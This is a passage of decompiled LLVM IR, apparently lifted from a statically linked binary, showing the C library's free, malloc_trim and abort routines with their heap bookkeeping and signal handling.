  uselistorder i32 %v0_80507f4, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_80507d1, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8050882, { 1, 0 }
  uselistorder i32 %v1_805079c, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8050919, { 1, 0 }
  uselistorder label %dec_label_pc_80508a5, { 1, 0 }
  uselistorder label %dec_label_pc_8050885, { 1, 0 }
  uselistorder label %dec_label_pc_8050851, { 1, 0 }
  uselistorder label %dec_label_pc_8050849, { 1, 0 }
  uselistorder label %dec_label_pc_8050814, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8050921 = load i32, i32* @ebp, align 4
  %v0_8050922 = load i32, i32* @edi, align 4
  %v0_8050923 = load i32, i32* @esi, align 4
  %v0_8050924 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_805092c = icmp eq i32 %arg1, 0
  br i1 %v1_805092c, label %dec_label_pc_8050ab5, label %dec_label_pc_8050934

dec_label_pc_8050934:                             ; preds = %entry
  %v2_805093f = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805093f, i32* @eax, align 4
  %v2_8050944 = call i32 @__pthread_return_void(i32 %v2_805093f, i32 134550743)
  store i32 %v2_8050944, i32* %eax.global-to-local, align 4
  %v1_8050950 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058370.214 to i32))
  %v1_8050955 = add i32 %arg1, -8
  store i32 %v1_8050955, i32* @ecx, align 4
  %v0_8050958 = load i8, i8* @global_var_805e7e0.215, align 1
  %v1_8050958 = sext i8 %v0_8050958 to i32
  store i32 %v1_8050958, i32* %eax.global-to-local, align 4
  %v1_8050960 = add i32 %arg1, -4
  %v2_8050960 = inttoptr i32 %v1_8050960 to i32*
  %v3_8050960 = load i32, i32* %v2_8050960, align 4
  %v1_8050965 = and i32 %v3_8050960, -4
  %v4_8050965 = trunc i32 %v1_8050965 to i8
  store i32 %v1_8050965, i32* @ebx, align 4
  %v8_805096a = icmp ugt i8 %v4_8050965, %v0_8050958
  br i1 %v8_805096a, label %dec_label_pc_805098c, label %dec_label_pc_805096c

dec_label_pc_805096c:                             ; preds = %dec_label_pc_8050934
  %v2_805096c = udiv i32 %v3_8050960, 8
  %v1_805096f = or i32 %v1_8050958, 3
  %v3_805096f = trunc i32 %v1_805096f to i8
  store i32 %v1_805096f, i32* %eax.global-to-local, align 4
  store i8 %v3_805096f, i8* @global_var_805e7e0.215, align 32
  %v1_8050977 = mul nuw i32 %v2_805096c, 4
  %v2_8050977 = add i32 %v1_8050977, ptrtoint (i8* @global_var_805e7e0.215 to i32)
  store i32 %v2_8050977, i32* @edx, align 4
  %v1_805097e = add i32 %v1_8050977, add (i32 ptrtoint (i8* @global_var_805e7e0.215 to i32), i32 -4)
  %v2_805097e = inttoptr i32 %v1_805097e to i32*
  %v3_805097e = load i32, i32* %v2_805097e, align 4
  store i32 %v3_805097e, i32* %eax.global-to-local, align 4
  %v3_8050981 = inttoptr i32 %arg1 to i32*
  store i32 %v3_805097e, i32* %v3_8050981, align 4
  %v0_8050984 = load i32, i32* @ecx, align 4
  %v1_8050984 = load i32, i32* @edx, align 4
  %v2_8050984 = add i32 %v1_8050984, -4
  %v3_8050984 = inttoptr i32 %v2_8050984 to i32*
  store i32 %v0_8050984, i32* %v3_8050984, align 4
  br label %dec_label_pc_8050aa4

dec_label_pc_805098c:                             ; preds = %dec_label_pc_8050934
  %v1_805098c = trunc i32 %v3_8050960 to i8
  %v2_805098c = and i8 %v1_805098c, 2
  %v3_805098c = icmp eq i8 %v2_805098c, 0
  %v5_805098c = zext i8 %v2_805098c to i32
  %v7_805098c = and i32 %v3_8050960, -256
  %v8_805098c = or i32 %v5_805098c, %v7_805098c
  store i32 %v8_805098c, i32* @edx, align 4
  %v1_805098f = icmp eq i1 %v3_805098c, false
  br i1 %v1_805098f, label %dec_label_pc_8050a84, label %dec_label_pc_8050995

dec_label_pc_8050995:                             ; preds = %dec_label_pc_805098c
  %v1_8050995 = or i32 %v1_8050958, 1
  %v3_8050995 = trunc i32 %v1_8050995 to i8
  store i32 %v1_8050995, i32* %eax.global-to-local, align 4
  %v2_8050998 = add i32 %v1_8050965, %v1_8050955
  store i32 %v2_8050998, i32* @esi, align 4
  store i8 %v3_8050995, i8* @global_var_805e7e0.215, align 32
  %v1_80509a0 = add i32 %v2_8050998, 4
  %v2_80509a0 = inttoptr i32 %v1_80509a0 to i32*
  %v3_80509a0 = load i32, i32* %v2_80509a0, align 4
  store i32 %v3_80509a0, i32* %eax.global-to-local, align 4
  %v2_80509a7 = inttoptr i32 %v1_8050960 to i8*
  %v3_80509a7 = load i8, i8* %v2_80509a7, align 1
  %v4_80509a7 = urem i8 %v3_80509a7, 2
  %v5_80509a7 = icmp eq i8 %v4_80509a7, 0
  %v1_80509ab = icmp eq i1 %v5_80509a7, false
  br i1 %v1_80509ab, label %dec_label_pc_80509ce, label %dec_label_pc_80509ad

dec_label_pc_80509ad:                             ; preds = %dec_label_pc_8050995
  %v2_80509ad = inttoptr i32 %v1_8050955 to i32*
  %v3_80509ad = load i32, i32* %v2_80509ad, align 4
  store i32 %v3_80509ad, i32* @ebp, align 4
  %v2_80509b2 = sub i32 %v1_8050955, %v3_80509ad
  store i32 %v2_80509b2, i32* %eax.global-to-local, align 4
  %v1_80509b4 = add i32 %v2_80509b2, 8
  %v2_80509b4 = inttoptr i32 %v1_80509b4 to i32*
  %v3_80509b4 = load i32, i32* %v2_80509b4, align 4
  store i32 %v3_80509b4, i32* @edi, align 4
  %v1_80509b7 = add i32 %v2_80509b2, 12
  %v2_80509b7 = inttoptr i32 %v1_80509b7 to i32*
  %v3_80509b7 = load i32, i32* %v2_80509b7, align 4
  store i32 %v3_80509b7, i32* @edx, align 4
  %v1_80509ba = add i32 %v3_80509b4, 12
  %v2_80509ba = inttoptr i32 %v1_80509ba to i32*
  %v3_80509ba = load i32, i32* %v2_80509ba, align 4
  store i32 %v3_80509ba, i32* @ecx, align 4
  %v12_80509bd = icmp eq i32 %v3_80509ba, %v2_80509b2
  %v1_80509bf = icmp eq i1 %v12_80509bd, false
  br i1 %v1_80509bf, label %dec_label_pc_80509fd, label %dec_label_pc_80509c1

dec_label_pc_80509c1:                             ; preds = %dec_label_pc_80509ad
  %v1_80509c1 = add i32 %v3_80509b7, 8
  %v2_80509c1 = inttoptr i32 %v1_80509c1 to i32*
  %v3_80509c1 = load i32, i32* %v2_80509c1, align 4
  %v15_80509c1 = icmp eq i32 %v3_80509c1, %v3_80509ba
  %v1_80509c4 = icmp eq i1 %v15_80509c1, false
  br i1 %v1_80509c4, label %dec_label_pc_80509fd, label %dec_label_pc_80509c6

dec_label_pc_80509c6:                             ; preds = %dec_label_pc_80509c1
  %v2_80509c6 = add i32 %v3_80509ad, %v1_8050965
  store i32 %v2_80509c6, i32* @ebx, align 4
  store i32 %v3_80509b7, i32* %v2_80509ba, align 4
  %v0_80509cb = load i32, i32* @edi, align 4
  %v1_80509cb = load i32, i32* @edx, align 4
  %v2_80509cb = add i32 %v1_80509cb, 8
  %v3_80509cb = inttoptr i32 %v2_80509cb to i32*
  store i32 %v0_80509cb, i32* %v3_80509cb, align 4
  %v0_80509d5.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80509ce

dec_label_pc_80509ce:                             ; preds = %dec_label_pc_8050995, %dec_label_pc_80509c6
  %v1_80509e1 = phi i32 [ %v2_8050998, %dec_label_pc_8050995 ], [ %v0_80509d5.pre, %dec_label_pc_80509c6 ]
  %v1_80509d2 = and i32 %v3_80509a0, -4
  store i32 %v1_80509d2, i32* @ebp, align 4
  %v1_80509d5 = load i32, i32* @global_var_805e80c.216, align 4
  %v12_80509d5 = icmp eq i32 %v1_80509e1, %v1_80509d5
  br i1 %v12_80509d5, label %dec_label_pc_8050a2f, label %dec_label_pc_80509dd

dec_label_pc_80509dd:                             ; preds = %dec_label_pc_80509ce
  %v2_80509dd = add i32 %v1_80509e1, 4
  %v3_80509dd = add i32 %v2_80509dd, %v1_80509d2
  %v4_80509dd = inttoptr i32 %v3_80509dd to i32*
  %v5_80509dd = load i32, i32* %v4_80509dd, align 4
  store i32 %v5_80509dd, i32* %eax.global-to-local, align 4
  %v3_80509e1 = inttoptr i32 %v2_80509dd to i32*
  store i32 %v1_80509d2, i32* %v3_80509e1, align 4
  %v0_80509e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80509e4 = urem i32 %v0_80509e4, 2
  %v2_80509e4 = icmp eq i32 %v1_80509e4, 0
  store i32 %v1_80509e4, i32* %eax.global-to-local, align 4
  %v1_80509e9 = icmp eq i1 %v2_80509e4, false
  br i1 %v1_80509e9, label %dec_label_pc_8050a0a, label %dec_label_pc_80509eb

dec_label_pc_80509eb:                             ; preds = %dec_label_pc_80509dd
  %v0_80509eb = load i32, i32* @esi, align 4
  %v1_80509eb = add i32 %v0_80509eb, 8
  %v2_80509eb = inttoptr i32 %v1_80509eb to i32*
  %v3_80509eb = load i32, i32* %v2_80509eb, align 4
  store i32 %v3_80509eb, i32* @edx, align 4
  %v1_80509ee = add i32 %v0_80509eb, 12
  %v2_80509ee = inttoptr i32 %v1_80509ee to i32*
  %v3_80509ee = load i32, i32* %v2_80509ee, align 4
  store i32 %v3_80509ee, i32* %eax.global-to-local, align 4
  %v1_80509f1 = add i32 %v3_80509eb, 12
  %v2_80509f1 = inttoptr i32 %v1_80509f1 to i32*
  %v3_80509f1 = load i32, i32* %v2_80509f1, align 4
  store i32 %v3_80509f1, i32* @edi, align 4
  %v12_80509f4 = icmp eq i32 %v3_80509f1, %v0_80509eb
  %v1_80509f6 = icmp eq i1 %v12_80509f4, false
  br i1 %v1_80509f6, label %dec_label_pc_80509fd, label %dec_label_pc_80509f8

dec_label_pc_80509f8:                             ; preds = %dec_label_pc_80509eb
  %v1_80509f8 = add i32 %v3_80509ee, 8
  %v2_80509f8 = inttoptr i32 %v1_80509f8 to i32*
  %v3_80509f8 = load i32, i32* %v2_80509f8, align 4
  %v15_80509f8 = icmp eq i32 %v3_80509f8, %v3_80509f1
  br i1 %v15_80509f8, label %dec_label_pc_8050a02, label %dec_label_pc_80509fd

dec_label_pc_80509fd:                             ; preds = %dec_label_pc_80509f8, %dec_label_pc_80509eb, %dec_label_pc_80509c1, %dec_label_pc_80509ad
  %v0_80509fd = call i32 @abort()
  store i32 %v0_80509fd, i32* %eax.global-to-local, align 4
  %v1_8050a02.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050a02

dec_label_pc_8050a02:                             ; preds = %dec_label_pc_80509f8, %dec_label_pc_80509fd
  %v1_8050a02 = phi i32 [ %v3_80509eb, %dec_label_pc_80509f8 ], [ %v1_8050a02.pre, %dec_label_pc_80509fd ]
  %v0_8050a02 = phi i32 [ %v3_80509ee, %dec_label_pc_80509f8 ], [ %v0_80509fd, %dec_label_pc_80509fd ]
  %v2_8050a02 = add i32 %v1_8050a02, 12
  %v3_8050a02 = inttoptr i32 %v2_8050a02 to i32*
  store i32 %v0_8050a02, i32* %v3_8050a02, align 4
  %v0_8050a05 = load i32, i32* @edx, align 4
  %v1_8050a05 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a05 = add i32 %v1_8050a05, 8
  %v3_8050a05 = inttoptr i32 %v2_8050a05 to i32*
  store i32 %v0_8050a05, i32* %v3_8050a05, align 4
  %v0_8050a08 = load i32, i32* @ebx, align 4
  %v1_8050a08 = load i32, i32* @ebp, align 4
  %v2_8050a08 = add i32 %v1_8050a08, %v0_8050a08
  store i32 %v2_8050a08, i32* @ebx, align 4
  br label %dec_label_pc_8050a0a

dec_label_pc_8050a0a:                             ; preds = %dec_label_pc_80509dd, %dec_label_pc_8050a02
  %v0_8050a0a = load i32, i32* @global_var_805e81c.234, align 4
  store i32 %v0_8050a0a, i32* %eax.global-to-local, align 4
  %v0_8050a0f = load i32, i32* @ecx, align 4
  %v1_8050a0f = add i32 %v0_8050a0f, 12
  %v2_8050a0f = inttoptr i32 %v1_8050a0f to i32*
  store i32 ptrtoint (i32* @global_var_805e814.218 to i32), i32* %v2_8050a0f, align 4
  %v0_8050a16 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050a16 = load i32, i32* @ecx, align 4
  %v2_8050a16 = add i32 %v1_8050a16, 8
  %v3_8050a16 = inttoptr i32 %v2_8050a16 to i32*
  store i32 %v0_8050a16, i32* %v3_8050a16, align 4
  %v0_8050a19 = load i32, i32* @ebx, align 4
  %v1_8050a19 = load i32, i32* @ecx, align 4
  %v3_8050a19 = add i32 %v1_8050a19, %v0_8050a19
  %v4_8050a19 = inttoptr i32 %v3_8050a19 to i32*
  store i32 %v0_8050a19, i32* %v4_8050a19, align 4
  %v0_8050a1c = load i32, i32* @ecx, align 4
  %v1_8050a1c = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a1c = add i32 %v1_8050a1c, 12
  %v3_8050a1c = inttoptr i32 %v2_8050a1c to i32*
  store i32 %v0_8050a1c, i32* %v3_8050a1c, align 4
  %v0_8050a1f = load i32, i32* @ebx, align 4
  %v1_8050a21 = or i32 %v0_8050a1f, 1
  store i32 %v1_8050a21, i32* %eax.global-to-local, align 4
  %v0_8050a24 = load i32, i32* @ecx, align 4
  store i32 %v0_8050a24, i32* @global_var_805e81c.234, align 4
  %v2_8050a2a = add i32 %v0_8050a24, 4
  %v3_8050a2a = inttoptr i32 %v2_8050a2a to i32*
  store i32 %v1_8050a21, i32* %v3_8050a2a, align 4
  br label %dec_label_pc_8050a3f

dec_label_pc_8050a2f:                             ; preds = %dec_label_pc_80509ce
  %v0_8050a2f = load i32, i32* @ebx, align 4
  %v2_8050a2f = add i32 %v0_8050a2f, %v1_80509d2
  store i32 %v2_8050a2f, i32* @ebx, align 4
  %v1_8050a33 = or i32 %v2_8050a2f, 1
  store i32 %v1_8050a33, i32* %eax.global-to-local, align 4
  %v1_8050a36 = load i32, i32* @ecx, align 4
  %v2_8050a36 = add i32 %v1_8050a36, 4
  %v3_8050a36 = inttoptr i32 %v2_8050a36 to i32*
  store i32 %v1_8050a33, i32* %v3_8050a36, align 4
  %v0_8050a39 = load i32, i32* @ecx, align 4
  store i32 %v0_8050a39, i32* @global_var_805e80c.216, align 4
  br label %dec_label_pc_8050a3f

dec_label_pc_8050a3f:                             ; preds = %dec_label_pc_8050a0a, %dec_label_pc_8050a2f
  %v0_8050a3f = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8050a3f, 131072
  br i1 %tmp21, label %dec_label_pc_8050aa4, label %dec_label_pc_8050a47

dec_label_pc_8050a47:                             ; preds = %dec_label_pc_8050a3f
  %v0_8050a47 = load i8, i8* @global_var_805e7e0.215, align 32
  %v1_8050a47 = and i8 %v0_8050a47, 2
  %v2_8050a47 = icmp eq i8 %v1_8050a47, 0
  br i1 %v2_8050a47, label %dec_label_pc_8050a60, label %dec_label_pc_8050a50

dec_label_pc_8050a50:                             ; preds = %dec_label_pc_8050a47
  %v2_8050a58 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_805e7e0.215 to i32*))
  store i32 %v2_8050a58, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050a60

dec_label_pc_8050a60:                             ; preds = %dec_label_pc_8050a47, %dec_label_pc_8050a50
  %v0_8050a60 = load i32, i32* @global_var_805e80c.216, align 4
  store i32 %v0_8050a60, i32* %eax.global-to-local, align 4
  %v1_8050a65 = add i32 %v0_8050a60, 4
  %v2_8050a65 = inttoptr i32 %v1_8050a65 to i32*
  %v3_8050a65 = load i32, i32* %v2_8050a65, align 4
  %v1_8050a68 = and i32 %v3_8050a65, -4
  store i32 %v1_8050a68, i32* %eax.global-to-local, align 4
  %v1_8050a6b = load i32, i32* @global_var_805eb24.232, align 4
  %v7_8050a6b = icmp ult i32 %v1_8050a68, %v1_8050a6b
  br i1 %v7_8050a6b, label %dec_label_pc_8050aa4, label %dec_label_pc_8050a73

dec_label_pc_8050a73:                             ; preds = %dec_label_pc_8050a60
  store i32 ptrtoint (i8* @global_var_805e7e0.215 to i32), i32* @edx, align 4
  %v0_8050a78 = load i32, i32* @global_var_805eb28.230, align 8
  store i32 %v0_8050a78, i32* @eax, align 4
  %v0_8050a7d = call i32 @__malloc_trim()
  store i32 %v0_8050a7d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050aa4

dec_label_pc_8050a84:                             ; preds = %dec_label_pc_805098c
  %v2_8050a84 = inttoptr i32 %v1_8050955 to i32*
  %v3_8050a84 = load i32, i32* %v2_8050a84, align 4
  %v0_8050a87 = load i32, i32* @global_var_805eb30.223, align 16
  %v1_8050a87 = add i32 %v0_8050a87, -1
  store i32 %v1_8050a87, i32* @global_var_805eb30.223, align 16
  %v2_8050a8d = add i32 %v3_8050a84, %v1_8050965
  store i32 %v2_8050a8d, i32* %eax.global-to-local, align 4
  %v2_8050a90 = sub i32 %v1_8050955, %v3_8050a84
  %v0_8050a96 = load i32, i32* @global_var_805eb44.226, align 4
  %v2_8050a96 = sub i32 %v0_8050a96, %v2_8050a8d
  store i32 %v2_8050a96, i32* @global_var_805eb44.226, align 4
  %v4_8050a9c = call i32 @munmap(i32 %v2_8050a90, i32 %v2_8050a8d, i32 %v1_8050965, i32 %v1_8050965)
  store i32 %v4_8050a9c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050aa4

dec_label_pc_8050aa4:                             ; preds = %dec_label_pc_8050a60, %dec_label_pc_8050a3f, %dec_label_pc_8050a73, %dec_label_pc_805096c, %dec_label_pc_8050a84
  store i32 %v2_805093f, i32* @eax, align 4
  %v2_8050aad = call i32 @__pthread_return_void(i32 %v2_805093f, i32 1)
  store i32 %v2_8050aad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050ab5

dec_label_pc_8050ab5:                             ; preds = %entry, %dec_label_pc_8050aa4
  %.0 = phi i32 [ undef, %entry ], [ %v2_8050aad, %dec_label_pc_8050aa4 ]
  store i32 %v0_8050924, i32* @ebx, align 4
  store i32 %v0_8050923, i32* @esi, align 4
  store i32 %v0_8050922, i32* @edi, align 4
  store i32 %v0_8050921, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8050a84, { 1, 0 }
  uselistorder i32 %v0_8050a19, { 1, 0 }
  uselistorder i32 %v1_80509e4, { 1, 0 }
  uselistorder i32 %v2_80509dd, { 1, 0 }
  uselistorder i32 %v1_80509d2, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80509e1, { 1, 0 }
  uselistorder i32 %v1_8050965, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050960, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050955, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_805e7e0.215 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_805e814.218 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_805e80c.216, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_8058370.214 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8050ab5, { 1, 0 }
  uselistorder label %dec_label_pc_8050aa4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8050a60, { 1, 0 }
  uselistorder label %dec_label_pc_8050a3f, { 1, 0 }
  uselistorder label %dec_label_pc_8050a0a, { 1, 0 }
  uselistorder label %dec_label_pc_8050a02, { 1, 0 }
  uselistorder label %dec_label_pc_80509ce, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8050abd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050aca = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_805e7e0.215 to i8) to i32) to i32*))
  %v0_8050acf = load i32, i32* @ebx, align 4
  store i32 %v0_8050acf, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_805e7e0.215 to i32), i32* @edx, align 4
  store i32 %v0_8050abd, i32* @ebx, align 4
  %v0_8050ada = call i32 @__malloc_trim()
  ret i32 %v0_8050ada

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_805e7e0.215 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_805e7e0.215, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8050aec = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058388.235 to i32))
  %v12_8050af6 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050afb

dec_label_pc_8050afb:                             ; preds = %dec_label_pc_8050afb.dec_label_pc_8050afb_crit_edge, %entry
  %v0_8050afb = phi i32 [ %v12_8050af6, %entry ], [ %v0_8050afb.pre, %dec_label_pc_8050afb.dec_label_pc_8050afb_crit_edge ]
  %v1_8050b0622 = phi i32 [ 31, %entry ], [ %v1_8050b06, %dec_label_pc_8050afb.dec_label_pc_8050afb_crit_edge ]
  %v2_8050afb = mul i32 %v1_8050b0622, 4
  %v3_8050afb = add i32 %v2_8050afb, 152
  %v4_8050afb = add i32 %v3_8050afb, %v0_8050afb
  %v5_8050afb = inttoptr i32 %v4_8050afb to i32*
  store i32 0, i32* %v5_8050afb, align 4
  %v0_8050b06.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050b06 = add i32 %v0_8050b06.pre, -1
  %v9_8050b06 = icmp slt i32 %v1_8050b06, 0
  store i32 %v1_8050b06, i32* %eax.global-to-local, align 4
  %v1_8050b07 = icmp eq i1 %v9_8050b06, false
  br i1 %v1_8050b07, label %dec_label_pc_8050afb.dec_label_pc_8050afb_crit_edge, label %dec_label_pc_8050b09

dec_label_pc_8050afb.dec_label_pc_8050afb_crit_edge: ; preds = %dec_label_pc_8050afb
  %v0_8050afb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050afb

dec_label_pc_8050b09:                             ; preds = %dec_label_pc_8050afb
  %v0_8050b09 = load i32, i32* @ebx, align 4
  %v2_8050b0d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_8050b0d, i32* @ebx, align 4
  %v4_8050b15 = call i32 @__sigaddset(i32 %v2_8050b0d, i32 6, i32 %v0_8050b09, i32 %v0_8050b09)
  store i32 %v4_8050b15, i32* %eax.global-to-local, align 4
  %v1_8050b1d = icmp eq i32 %v4_8050b15, 0
  %v1_8050b1f = icmp eq i1 %v1_8050b1d, false
  br i1 %v1_8050b1f, label %dec_label_pc_8050b2f, label %dec_label_pc_8050b21

dec_label_pc_8050b21:                             ; preds = %dec_label_pc_8050b09
  %v3_8050b27 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8050b27 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8050b27, i32 0)
  store i32 %v4_8050b27, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b2f

dec_label_pc_8050b2f:                             ; preds = %dec_label_pc_8050b09, %dec_label_pc_8050b21
  %v2_8050b674 = phi i32 [ %v4_8050b15, %dec_label_pc_8050b09 ], [ %v4_8050b27, %dec_label_pc_8050b21 ]
  %v0_8050b2f = load i8, i8* @global_var_805e700.236, align 256
  %v1_8050b2f = icmp eq i8 %v0_8050b2f, 0
  %v1_8050b36 = icmp eq i1 %v1_8050b2f, false
  br i1 %v1_8050b36, label %dec_label_pc_8050b67, label %dec_label_pc_8050b38

dec_label_pc_8050b38:                             ; preds = %dec_label_pc_8050b2f
  store i8 1, i8* @global_var_805e700.236, align 256
  br label %dec_label_pc_8050b3f

dec_label_pc_8050b3f:                             ; preds = %dec_label_pc_8050ba6, %dec_label_pc_8050b38
  %v1_8050b47 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058388.235 to i32))
  store i32 %v1_8050b47, i32* %eax.global-to-local, align 4
  %v1_8050b53 = call i32 @__raise(i32 6)
  store i32 %v1_8050b53, i32* %eax.global-to-local, align 4
  %v1_8050b5f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058388.235 to i32))
  store i32 %v1_8050b5f, i32* %eax.global-to-local, align 4
  %v0_8050b67.pre = load i8, i8* @global_var_805e700.236, align 256
  br label %dec_label_pc_8050b67

dec_label_pc_8050b67:                             ; preds = %dec_label_pc_8050b2f, %dec_label_pc_8050b3f
  %v2_8050b67 = phi i32 [ %v2_8050b674, %dec_label_pc_8050b2f ], [ %v1_8050b5f, %dec_label_pc_8050b3f ]
  %v0_8050b67 = phi i8 [ %v0_8050b2f, %dec_label_pc_8050b2f ], [ %v0_8050b67.pre, %dec_label_pc_8050b3f ]
  %v1_8050b67 = zext i8 %v0_8050b67 to i32
  %v3_8050b67 = and i32 %v2_8050b67, -256
  %v4_8050b67 = or i32 %v1_8050b67, %v3_8050b67
  store i32 %v4_8050b67, i32* %eax.global-to-local, align 4
  %v10_8050b6c = icmp eq i8 %v0_8050b67, 1
  %v1_8050b6e = icmp eq i1 %v10_8050b6c, false
  br i1 %v1_8050b6e, label %dec_label_pc_8050bc8, label %dec_label_pc_8050b70

dec_label_pc_8050b70:                             ; preds = %dec_label_pc_8050b67
  store i8 2, i8* @global_var_805e700.236, align 256
  %v2_8050b7f = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8050b7f, i32* %eax.global-to-local, align 4
  %v3_8050b84 = bitcast i32* %stack_var_-272 to i8*
  %v4_8050b84 = call i32 @__GI_memset(i8* %v3_8050b84, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b9b

dec_label_pc_8050b9b:                             ; preds = %dec_label_pc_8050b9b.dec_label_pc_8050b9b_crit_edge, %dec_label_pc_8050b70
  %v0_8050b9b = phi i32 [ %v12_8050af6, %dec_label_pc_8050b70 ], [ %v0_8050b9b.pre, %dec_label_pc_8050b9b.dec_label_pc_8050b9b_crit_edge ]
  %v1_8050ba321 = phi i32 [ 31, %dec_label_pc_8050b70 ], [ %v1_8050ba3, %dec_label_pc_8050b9b.dec_label_pc_8050b9b_crit_edge ]
  %v2_8050b9b = mul i32 %v1_8050ba321, 4
  %v3_8050b9b = add i32 %v2_8050b9b, 16
  %v4_8050b9b = add i32 %v3_8050b9b, %v0_8050b9b
  %v5_8050b9b = inttoptr i32 %v4_8050b9b to i32*
  store i32 -1, i32* %v5_8050b9b, align 4
  %v0_8050ba3.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ba3 = add i32 %v0_8050ba3.pre, -1
  %v9_8050ba3 = icmp slt i32 %v1_8050ba3, 0
  store i32 %v1_8050ba3, i32* %eax.global-to-local, align 4
  %v1_8050ba4 = icmp eq i1 %v9_8050ba3, false
  br i1 %v1_8050ba4, label %dec_label_pc_8050b9b.dec_label_pc_8050b9b_crit_edge, label %dec_label_pc_8050ba6

dec_label_pc_8050b9b.dec_label_pc_8050b9b_crit_edge: ; preds = %dec_label_pc_8050b9b
  %v0_8050b9b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050b9b

dec_label_pc_8050ba6:                             ; preds = %dec_label_pc_8050b9b
  store i32 %v2_8050b7f, i32* %eax.global-to-local, align 4
  %v4_8050bbb = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_8050bbb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050b3f

dec_label_pc_8050bc8:                             ; preds = %dec_label_pc_8050b67
  %v10_8050bc8 = icmp eq i8 %v0_8050b67, 2
  %v1_8050bca = icmp eq i1 %v10_8050bc8, false
  br i1 %v1_8050bca, label %dec_label_pc_8050bd4, label %dec_label_pc_8050bd4.thread

dec_label_pc_8050bd4.thread:                      ; preds = %dec_label_pc_8050bc8
  store i8 3, i8* @global_var_805e700.236, align 256
  br label %dec_label_pc_8050bdd

dec_label_pc_8050bd4:                             ; preds = %dec_label_pc_8050bc8
  %v9_8050bd4 = icmp eq i8 %v0_8050b67, 3
  %v1_8050bdb = icmp eq i1 %v9_8050bd4, false
  br i1 %v1_8050bdb, label %dec_label_pc_8050bee, label %dec_label_pc_8050bdd

dec_label_pc_8050bdd:                             ; preds = %dec_label_pc_8050bd4.thread, %dec_label_pc_8050bd4
  store i8 4, i8* @global_var_805e700.236, align 256
  %v1_8050be9 = call i32 @__GI__exit(i32 127)
  unreachable

